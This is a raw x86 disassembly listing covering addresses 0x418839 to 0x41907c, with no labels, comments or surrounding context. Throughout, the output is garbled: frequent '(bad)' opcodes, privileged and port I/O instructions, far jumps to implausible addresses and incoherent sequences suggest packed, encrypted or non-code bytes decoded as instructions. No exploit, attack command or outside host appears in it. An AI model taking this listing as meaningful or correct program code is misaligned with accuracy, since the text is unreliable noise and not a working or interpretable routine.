  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
